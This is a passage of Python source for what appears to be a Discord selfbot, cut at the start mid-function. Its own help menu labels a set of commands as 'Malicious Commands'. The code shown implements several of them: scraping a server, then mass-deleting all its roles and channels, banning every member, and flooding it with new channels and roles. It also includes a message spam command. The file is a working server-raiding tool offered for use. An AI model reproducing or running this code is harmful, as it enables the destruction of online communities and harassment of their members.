    time.sleep(0.1)
    if help is None:
        for channel in client.private_channels:
            if isinstance(channel, discord.GroupChannel):
                await channel.leave()
                print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mleft_group_chat\x1b[30;1m]•{channel}")
    else:
        embed = discord.Embed(title="Groupleave help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Groupleave", inline=False)
        embed.add_field(name="Description", value="Leaves all group chats", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

@client.command() #Gen
async def purge(ctx,amount="help"):
    global purgeMessage
    purgeMessage = True

    await ctx.message.delete()
    time.sleep(0.1)

    if amount.lower() == "help":
        embed = discord.Embed(title="Purge help", color=0x9d00ff)
        embed.add_field(name="Usage", value=f"**{prefix}**Purge (**AMOUNT**)", inline=False)
        embed.add_field(name="Amount", value="The amount of messages to delete", inline=False)
        embed.add_field(name="Description", value="Deletes a specific amount of messages", inline=False)

        embed.timestamp = datetime.now()

        await ctx.send(embed=embed)
        return

    try:
        c = int(amount)
        c += 1
    except ValueError:
        console_log_error(f"{amount} is not a valid int")
        return

    async for message in ctx.message.channel.history(limit=int(amount)).filter(lambda m: m.author == client.user).map(lambda m: m):
        try:
            if purgeMessage != True: 
                return
            await message.delete()
            print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mmessage_deleted\x1b[30;1m]\x1b[37;1m")
            await asyncio.sleep(0.3)
        except Exception as e:
            pass

@client.command() #Mal
async def createchannel(ctx,guildID="help",channelAmount="",channelName=""):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":

        embed = discord.Embed(title="Create channel help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**createchannel (**GUILD ID**) (**CHANNEL AMOUNT**) (**CHANNEL NAME**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)
        embed.add_field(name="Channel amount",value="Channel amount is the amount of channels being created",inline=False)
        embed.add_field(name="Channel name",value="Name of the channels being created",inline=False)
        embed.add_field(name="Description", value="Creates a number of channels", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return

    if channelAmount == "":
        console_log_error("Missing channel amount")
        return
    if channelName == "":
        console_log_error("Missing channel name")
        return


    else:
        try:
            c = int(channelAmount)
            c += 1
        except ValueError:
            console_log_error(f"{channelAmount} is not a valid int")
            return
        for i in range(int(channelAmount)):
            threading.Thread(target=CreateChannel(guildID,channelName))

@client.command() #Mal
async def createrole(ctx,guildID="help",roleAmount="",roleName=""):
    await ctx.message.delete()
    time.sleep(0.1)

    if guildID.lower() == "help":

        embed = discord.Embed(title="Create channel help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**createrole (**GUILD ID**) (**ROLE AMOUNT**) (**ROLE NAME**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)
        embed.add_field(name="Channel amount",value="Role amount is the amount of roles being created",inline=False)
        embed.add_field(name="Channel name",value="Name of the roles being created",inline=False)
        embed.add_field(name="Description", value="Creates a number of roles", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return

    if roleAmount == "":
        console_log_error("Missing channel amount")
        return
    if roleName == "":
        console_log_error("Missing channel name")
        return


    else:
        try:
            c = int(roleAmount)
            c += 1
        except ValueError:
            console_log_error(f"{roleAmount} is not a valid int")
            return
        for i in range(int(roleAmount)):
            threading.Thread(target=CreateRole(guildID,roleName))

@client.command() #Mal
async def deleteroles(ctx,guildID="help"):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":
        embed = discord.Embed(title="Delete roles help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**deleteroles (**GUILD ID**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)

        embed.add_field(name="Description", value="Deletes all roles", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    try:
        await scraper(guildID)
        for i in roleLIST:
            threading.Thread(target=DeleteRole,args=(guildID,i)).start()
    except:
        console_log_error("Invalid guild id")
        pass

@client.command() #Mal
async def deletechannels(ctx,guildID="help"):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":
        embed = discord.Embed(title="Delete channels help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**deletechannels (**GUILD ID**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)

        embed.add_field(name="Description", value="Deletes all channels", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    try:
        await scraper(guildID)
        for i in channelLIST:
            threading.Thread(target=DeleteChannel,args=(guildID,i)).start()
    except:
        console_log_error("Invalid guild id")
        pass

@client.command() #Mal
async def banall(ctx,guildID="help"):
    await ctx.message.delete()
    time.sleep(0.1)
    if guildID.lower() == "help":
        embed = discord.Embed(title="Ban all help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**banall (**GUILD ID**)",inline=False)
        embed.add_field(name="Guild id",value="You can get guild id by enabling developer then right click the server name in the top left and click `Copy ID`",inline=False)

        embed.add_field(name="Description", value="Bans all members", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    try:
        await scraper(guildID)
        for i in memberLIST:
            threading.Thread(target=ban,args=(guildID,i)).start()
    except:
        console_log_error("Invalid guild id")
        pass

@client.command() #Gen
async def spam(ctx,amount="help",message=""):
    global spamMessage
    await ctx.message.delete()
    time.sleep(0.1)
    spamMessage = True

    if amount.lower() == "help":
        embed = discord.Embed(title="Spam help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**spam (**AMOUNT**) (**MESSAGE**)",inline=False)
        embed.add_field(name="Amount",value="Number of messages to spam",inline=False)
        embed.add_field(name="Message",value="The message to spam",inline=False)
        embed.add_field(name="Description", value="Spams your message", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    if amount == "":
        console_log_error("Missing amount")
        return
    if message == "":
        console_log_error("Missing message")
        return
    try:
        c = int(amount)
        c += 1
    except ValueError:
        console_log_error(f"{amount} is not a valid int")
        return
    if len(message) > 1500:
        console_log_error("Message is to long")
        return

    for i in range(int(amount)):
        if spamMessage == True:
            await ctx.send(message)
            print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mmessage_sent\x1b[30;1m]\x1b[37;1m")
            await asyncio.sleep(0.3)
        else:
            return

@client.command() #Gen
async def stop(ctx,method="help"):
    global spamMessage
    global purgeMessage
    await ctx.message.delete()
    time.sleep(0.1)

    if method.lower() == "help":
        embed = discord.Embed(title="Stop help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**stop (**METHOD**)",inline=False)
        embed.add_field(name="Method",value="The method is the command you want to stop like `spam`",inline=False)
        embed.add_field(name="Methods",value="Spam, and Purge",inline=False)
        embed.add_field(name="Description", value="Stop a process", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return
    if method.lower() == "spam":
        spamMessage = False
        print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mstopped_spam\x1b[30;1m]\x1b[37;1m")

    if method.lower() == "purge":
        purgeMessage = False
        print(f"\x1b[30;1m•[{now()}]•\x1b[30;1m[\x1b[36;1mstopped_purge\x1b[30;1m]\x1b[37;1m")

@client.command() #Gen
async def ping(ctx,help=None):
    await ctx.message.delete()
    time.sleep(0.1)

    if help is None:
        lat = round(client.latency, 4)
        embed = discord.Embed(title="Pong",color=0x9d00ff,description=f"`{lat}ms` :ping_pong:")
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Ping help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**ping",inline=False)

        embed.add_field(name="Description", value="Get delay in ms", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)

@client.command() #Fun
async def hug(ctx,userID="help"):

    await ctx.message.delete()
    time.sleep(0.1)


    if userID.lower() == "help":
        embed = discord.Embed(title="Hug help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**hug (**USER**)",inline=False)
        embed.add_field(name="User", value="Mention user or get user id", inline=False)
        embed.add_field(name="Description", value="Hug user", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return

    try:

        user = await commands.converter.MemberConverter().convert(ctx,userID)
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()
        embed = discord.Embed(title=f"{ctx.author.name} hugged {user.name}",color=0x9d00ff)
        embed.timestamp = datetime.now()
        embed.set_image(url=res['url'])
        await ctx.send(embed=embed)
    except Exception as e:
        console_log_error(f"Invalid user id {e}")
        return

@client.command() #Fun
async def kiss(ctx,userID="help"):
    await ctx.message.delete()
    time.sleep(0.1)

    

    if userID.lower() == "help":
        embed = discord.Embed(title="Kiss help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**kiss (**USER**)",inline=False)
        embed.add_field(name="User", value="Mention user or get user id", inline=False)
        embed.add_field(name="Description", value="Kiss user", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return


    try:
        user = await commands.converter.MemberConverter().convert(ctx,userID)
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        embed = discord.Embed(title=f"{ctx.author.name} kissed {user.name}",color=0x9d00ff)
        embed.timestamp = datetime.now()
        embed.set_image(url=res['url'])
        await ctx.send(embed=embed)
    except Exception as e:
        console_log_error(f"Invalid user {e}")
        return

@client.command() #Fun
async def cuddle(ctx,userID="help"):

    await ctx.message.delete()
    time.sleep(0.1)

    if userID.lower() == "help":
        embed = discord.Embed(title="Cuddle help",color=0x9d00ff)
        embed.add_field(name="Usage",value=f"**{prefix}**cuddle (**USER**)",inline=False)
        embed.add_field(name="User", value="Mention user or get user id", inline=False)
        embed.add_field(name="Description", value="Cuddle user", inline=False)
        embed.timestamp = datetime.now()
        await ctx.send(embed=embed)
        return

    try:
        user = await commands.converter.MemberConverter().convert(ctx,userID)
        r = requests.get("https://nekos.life/api/v2/img/cuddle")
        res = r.json()
        embed = discord.Embed(title=f"{ctx.author.name} cuddled {user.name}",color=0x9d00ff)
        embed.timestamp = datetime.now()
        embed.set_image(url=res['url'])
        await ctx.send(embed=embed)
    except Exception as e:
        console_log_error(f"Invalid user id {e}")
        return

@client.command() #Gen
async def changeprefix(ctx,prefix):

    await ctx.message.delete()
    time.sleep(0.1)

    with open("config.json","r") as f:
        prefixes = json.load(f)
    
    prefixes["prefix"] = prefix

    with open("config.json","w") as f:
        json.dump(prefixes,f,indent=4)

    os.system("cls")
    print(banner)
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m")
    print(f"\x1b[30;1m                                               P r e f i x \x1b[37;1m=> \x1b[36;1m{prefix}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r n a m e \x1b[37;1m=> \x1b[36;1m{client.user.name}\x1b[37;1m")
    print(f"\x1b[30;1m                                               U s e r i d \x1b[37;1m=> \x1b[36;1m{client.user.id}\x1b[37;1m")
    print(f"\x1b[30;1m                  ==================================================================================\x1b[37;1m\n\n")


@client.command()
async def help(ctx):
    await ctx.message.delete()
    time.sleep(0.1)

    GeneralCommands = ["Info","Clear","Scrape","Purge","Groupleave","Spam","Stop","Ping","Changeprefix"]
    GeneralCommandCount = 0
    GeneralCommandString = ""

    MaliciousCommands =["Nuke","Createchannel","Createrole","Deleteroles","Deletechannels","Banall"]
    MaliciousCount = 0
    MaliciousString = ""

    FunCommands = ["Drip","Roast","Minecraft","Hug","Kiss","Cuddle"]
    FunCount = 0
    FunString = ""


    for command in GeneralCommands:
        GeneralCommandCount += 1
        GeneralCommandString += "**" + prefix + "** " + "*" + command + "*" + "\n"

    for command in MaliciousCommands:
        MaliciousCount += 1
        MaliciousString += "**" + prefix + "** " + "*" + command + "*" + "\n"

    for command in FunCommands:
        FunCount += 1
        FunString += "**" + prefix + "** " + "*" + command + "*" + "\n"

    TotalCommands = GeneralCommandCount + MaliciousCount + FunCount




    embed = discord.Embed(title="Help | Total commands [" + str(TotalCommands) + "]",color=0x9d00ff)
    embed.add_field(name=f"General Commands [{GeneralCommandCount}]",value=GeneralCommandString,inline=False)
    embed.add_field(name=f"Malicious Commands [{MaliciousCount}]",value=MaliciousString,inline=False)
    embed.add_field(name=f"Fun commands [{FunCount}]",value=FunString,inline=False)
    embed.add_field(name="Command help",value="(**COMMAND**) help")
    embed.set_footer(text=f"Total Commands [{TotalCommands}]")
    embed.timestamp = datetime.now()
    await ctx.send(embed=embed)



load()